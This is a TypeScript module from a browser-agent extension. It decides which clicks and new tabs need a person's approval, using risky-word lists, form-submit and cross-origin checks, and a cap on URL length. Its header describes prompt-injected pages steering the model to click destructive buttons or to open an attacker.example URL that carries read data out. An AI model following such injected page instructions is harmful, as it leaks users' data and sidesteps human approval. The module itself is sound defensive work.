/**
 * Which clicks and new tabs need a person's approval.
 *
 * A prompt-injected page can steer the model to click a destructive button
 * or to open `https://attacker.example/?d=<data it read>`. Typing, form
 * filling and console commands were already gated; this module decides when
 * a click or a new tab is risky enough to join them. Safe clicks (a tab, a
 * same-origin link, a toggle) still run without a prompt.
 */

/**
 * Words in a control's accessible name or text that mark it as destructive
 * or confirming. Matched as whole words, case-insensitively.
 */
export const RISKY_CLICK_WORDS: readonly string[] = [
  "delete",
  "remove",
  "submit",
  "send",
  "pay",
  "purchase",
  "buy",
  "checkout",
  "transfer",
  "confirm",
  "approve",
  "authorize",
  "authorise",
  "sign",
  "publish",
  "post",
  "deactivate",
  "disable",
  "deny",
  "reject",
  "revoke",
  "discard",
  "erase",
  "destroy",
  "terminate",
  "cancel",
  "archive",
  "unsubscribe",
  "reset",
];

/** What the page says about the element a click would land on. */
export interface ClickTargetInfo {
  found: true;
  tagName: string;
  role: string | null;
  accessibleName: string;
  /** The `type` attribute as written, lower-cased; null when absent. */
  typeAttribute: string | null;
  insideForm: boolean;
  formAction: string | null;
  formMethod: string | null;
  /** The resolved `href` of the link the click lands in, if any. */
  href: string | null;
  /** URL of the document holding the element. */
  documentUrl: string;
  /** The point lands on a frame or canvas, whose content cannot be inspected from here. */
  opaque: "frame" | "canvas" | null;
}

export interface ClickTargetNotFound {
  found: false;
  reason: string;
}

export type ClickTarget = ClickTargetInfo | ClickTargetNotFound;

export interface ClickRisk {
  risky: boolean;
  reasons: string[];
}

function originOf(url: string | null | undefined): string | null {
  if (!url) return null;
  try {
    const { origin } = new URL(url);
    return origin === "null" ? null : origin;
  } catch {
    return null;
  }
}

function escapeRegExp(text: string): string {
  return text.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

const RISKY_WORD_PATTERN = new RegExp(
  `\\b(${RISKY_CLICK_WORDS.map(escapeRegExp).join("|")})\\b`,
  "i",
);

function isSubmitControl(target: ClickTargetInfo): boolean {
  const type = target.typeAttribute;
  if (target.tagName === "input") return type === "submit" || type === "image";
  if (target.tagName !== "button") return false;
  return type === "submit" || (type === null && target.insideForm);
}

/** Decide whether a click on `target` needs approval. Pure. */
export function classifyClickRisk(target: ClickTarget): ClickRisk {
  if (!target.found) {
    return {
      risky: true,
      reasons: [`the click target could not be identified (${target.reason})`],
    };
  }
  const reasons: string[] = [];
  if (target.opaque === "frame") {
    reasons.push("the point is inside a frame whose content cannot be checked");
  } else if (target.opaque === "canvas") {
    reasons.push("the point is on a canvas whose content cannot be checked");
  }
  if (isSubmitControl(target)) {
    reasons.push("it submits a form");
  }
  const word = target.accessibleName.match(RISKY_WORD_PATTERN)?.[1];
  if (word) {
    reasons.push(`its label contains "${word.toLowerCase()}"`);
  }
  const linkOrigin = originOf(target.href);
  const pageOrigin = originOf(target.documentUrl);
  if (target.href && linkOrigin !== pageOrigin) {
    reasons.push(
      `it is a link to another origin (${linkOrigin ?? "non-web URL"})`,
    );
  }
  return { risky: reasons.length > 0, reasons };
}

/** The approval prompt text for a risky click. Shown to the person only. */
export function describeClickForApproval(
  target: ClickTarget,
  risk: ClickRisk,
  pageUrl: string | undefined,
): string {
  const lines: string[] = [];
  if (target.found) {
    const type = target.typeAttribute ? ` type=${target.typeAttribute}` : "";
    lines.push(
      `Click "${target.accessibleName || "(no name)"}" (<${target.tagName}${type}>, role ${target.role ?? "none"})`,
    );
    if (target.insideForm) {
      lines.push(
        `Form: ${(target.formMethod ?? "get").toUpperCase()} ${target.formAction ?? "(no action)"}`,
      );
    }
    if (target.href) lines.push(`Link: ${target.href}`);
  } else {
    lines.push("Click an element that could not be identified");
  }
  lines.push(`Page: ${originOf(pageUrl) ?? pageUrl ?? "unknown"}`);
  lines.push(`Why approval is needed: ${risk.reasons.join("; ")}`);
  return lines.join("\n");
}

/** Characters of path (after the first "/"), query and fragment above which a new tab's URL may be carrying data out. */
export const NEW_TAB_MAX_QUERY_AND_FRAGMENT = 128;

export type NewTabDecision =
  | { approval: "none" }
  | { approval: "required"; rememberable: boolean; reason: string };

/**
 * Whether opening `url` in a new tab needs approval, given the URL of the
 * tab the user is on. Same-origin destinations open freely; another origin
 * needs approval (a grant for that destination may skip it); a non-web
 * scheme or a long query or fragment always needs a fresh click.
 */
export function classifyNewTabUrl(
  url: string,
  currentPageUrl: string | undefined,
): NewTabDecision {
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return {
      approval: "required",
      rememberable: false,
      reason: "the URL cannot be parsed",
    };
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
    return {
      approval: "required",
      rememberable: false,
      reason: `it uses the ${parsed.protocol} scheme`,
    };
  }
  const carried =
    parsed.pathname.replace(/^\//, "").length +
    parsed.search.replace(/^\?/, "").length +
    parsed.hash.replace(/^#/, "").length;
  if (carried > NEW_TAB_MAX_QUERY_AND_FRAGMENT) {
    return {
      approval: "required",
      rememberable: false,
      reason: `its path, query and fragment are ${carried} characters long, enough to carry page data out`,
    };
  }
  if (parsed.origin === originOf(currentPageUrl)) return { approval: "none" };
  return {
    approval: "required",
    rememberable: true,
    reason: `it opens another origin (${parsed.origin})`,
  };
}

export type ClickTargetQuery = { uid: string } | { x: number; y: number };

/**
 * Injected with `chrome.scripting.executeScript`, so everything it uses is
 * defined inside it. Finds the element by snapshot uid (through open and
 * closed shadow roots) or at a viewport point, and describes the control a
 * click there would activate. Returns null when this frame has no match.
 */
export function inspectClickTargetInPage(
  query: ClickTargetQuery,
): ClickTarget | null {
  const shadowOf = (el: Element): ShadowRoot | null => {
    try {
      const dom = (
        globalThis as {
          chrome?: {
            dom?: {
              openOrClosedShadowRoot?: (
                element: HTMLElement,
              ) => ShadowRoot | null;
            };
          };
        }
      ).chrome?.dom;
      return dom?.openOrClosedShadowRoot && el instanceof HTMLElement
        ? dom.openOrClosedShadowRoot(el)
        : el.shadowRoot;
    } catch {
      return el.shadowRoot;
    }
  };

  const findByUid = (
    root: Document | ShadowRoot,
    uid: string,
  ): Element | null => {
    const selector = `[data-aipex-nodeid="${uid.replace(/["\\]/g, "\\$&")}"]`;
    const direct = root.querySelector(selector);
    if (direct) return direct;
    for (const el of root.querySelectorAll("*")) {
      const shadow = shadowOf(el);
      if (shadow) {
        const inner = findByUid(shadow, uid);
        if (inner) return inner;
      }
    }
    return null;
  };

  const elementAtPoint = (x: number, y: number): Element | null => {
    let el = document.elementFromPoint(x, y);
    for (let depth = 0; el && depth < 32; depth++) {
      const shadow = shadowOf(el);
      const inner = shadow?.elementFromPoint(x, y) ?? null;
      if (!inner || inner === el) break;
      el = inner;
    }
    return el;
  };

  const target =
    "uid" in query
      ? findByUid(document, query.uid)
      : elementAtPoint(query.x, query.y);
  if (!target) return null;

  const tag = target.tagName.toLowerCase();
  const opaque =
    tag === "iframe" || tag === "frame" || tag === "object" || tag === "embed"
      ? "frame"
      : tag === "canvas"
        ? "canvas"
        : null;

  const control =
    target.closest(
      'a[href], area[href], button, input, select, summary, [role="button"], [role="link"], [role="menuitem"], [role="tab"], [role="option"], [role="checkbox"], [role="switch"]',
    ) ?? target;

  const textOf = (el: Element | null): string =>
    (el?.textContent ?? "").replace(/\s+/g, " ").trim();
  const labelledBy = control.getAttribute("aria-labelledby");
  const labelledText = labelledBy
    ? labelledBy
        .split(/\s+/)
        .map((id) =>
          textOf(
            (control.getRootNode() as Document).getElementById?.(id) ?? null,
          ),
        )
        .join(" ")
        .trim()
    : "";
  const inputValue =
    control instanceof HTMLInputElement &&
    ["submit", "button", "reset", "image"].includes(control.type)
      ? control.value || control.alt
      : "";
  const name = (
    control.getAttribute("aria-label") ||
    labelledText ||
    inputValue ||
    textOf(control) ||
    control.getAttribute("title") ||
    ""
  ).slice(0, 120);

  const form =
    control instanceof HTMLButtonElement || control instanceof HTMLInputElement
      ? control.form
      : control.closest("form");
  const link = control.closest("a[href], area[href]") as
    | HTMLAnchorElement
    | HTMLAreaElement
    | null;
  const implicitRole: Record<string, string> = {
    a: "link",
    area: "link",
    button: "button",
    select: "combobox",
    summary: "button",
  };

  return {
    found: true,
    tagName: control.tagName.toLowerCase(),
    role:
      control.getAttribute("role") ??
      implicitRole[control.tagName.toLowerCase()] ??
      (control instanceof HTMLInputElement ? `input:${control.type}` : null),
    accessibleName: name,
    typeAttribute: control.getAttribute("type")?.toLowerCase() ?? null,
    insideForm: form !== null,
    formAction: form ? form.action : null,
    formMethod: form ? form.method : null,
    href: link ? link.href : null,
    documentUrl: location.href,
    opaque,
  };
}

/**
 * Describe the element a click would land on: by snapshot uid in any frame,
 * or at a viewport point in the top frame. Fails closed: anything that
 * cannot be inspected comes back as not found, which classifies as risky.
 */
export async function inspectClickTarget(
  tabId: number,
  query: ClickTargetQuery,
): Promise<ClickTarget> {
  try {
    const results = await chrome.scripting.executeScript({
      target:
        "uid" in query ? { tabId, allFrames: true } : { tabId, frameIds: [0] },
      func: inspectClickTargetInPage,
      args: [query],
    });
    const match = results
      .map((r) => r.result as ClickTarget | null | undefined)
      .find((r): r is ClickTarget => r != null);
    return (
      match ?? {
        found: false,
        reason:
          "uid" in query
            ? "no element with that uid in any frame"
            : "nothing at that point",
      }
    );
  } catch (error) {
    return {
      found: false,
      reason: error instanceof Error ? error.message : String(error),
    };
  }
}
